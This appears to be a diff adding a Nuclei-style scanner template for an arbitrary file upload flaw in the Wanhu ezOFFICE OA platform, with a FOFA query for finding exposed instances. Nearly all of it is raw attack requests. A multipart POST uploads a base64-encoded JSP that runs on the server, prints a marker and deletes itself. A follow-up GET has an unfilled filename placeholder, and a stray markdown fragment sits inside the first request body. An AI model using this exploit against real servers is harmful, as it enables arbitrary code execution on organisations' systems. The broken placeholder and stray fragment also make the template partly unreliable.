@@ -1,0 +1,59 @@
+id: poc-amdce80kcc4uane9
+info:
+  name: 万户OA informationmanager_upload.jsp存在 任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/amdce80kcc4uane9'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: amdce80kcc4uane9
+    fofa: app="万户ezOFFICE协同管理平台"
+http:
+- raw:
+  - 'POST /defaultroot/information_manager/informationmanager_upload.jsp?upload=1&dispControl=null&saveControl=null HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.1739.87 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+
+    Accept: */*
+
+    Connection: close
+
+
+    ------WebKitFormBoundary7MA4YWxkTrZu0gW
+
+    Content-Disposition: form-data; name="file1"; filename="tttesttt.jsp"
+
+    Content-Type: application/octet-stream
+
+
+    PCUgb3V0LnByaW50bG4oIjIwMmNiOTYyYWM1OTA3NWI5NjRiMDcxNTJkMjM0YjcwIik7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPg==
+
+    ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+
+    **上传定位：**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /defaultroot/upload/information/第一个响应中的filename HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.1739.87 Safari/537.36
+
+    Accept: */*
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
